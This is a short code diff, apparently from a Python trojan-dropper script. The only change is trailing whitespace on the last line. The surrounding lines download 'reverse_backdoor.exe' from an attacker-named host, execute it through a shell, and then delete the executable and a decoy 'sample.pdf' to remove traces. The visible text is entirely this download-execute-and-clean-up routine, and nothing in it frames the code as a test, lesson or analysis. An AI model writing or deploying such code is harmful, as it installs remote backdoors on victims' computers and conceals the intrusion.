@@ -20,4 +20,4 @@ download("http://attacker.address/evil-files/reverse_backdoor.exe")
 subprocess.call("reverse_backdoor.exe", shell=True)
 
 os.remove("sample.pdf")
-os.remove("reverse_backdoor.exe")
+os.remove("reverse_backdoor.exe") 
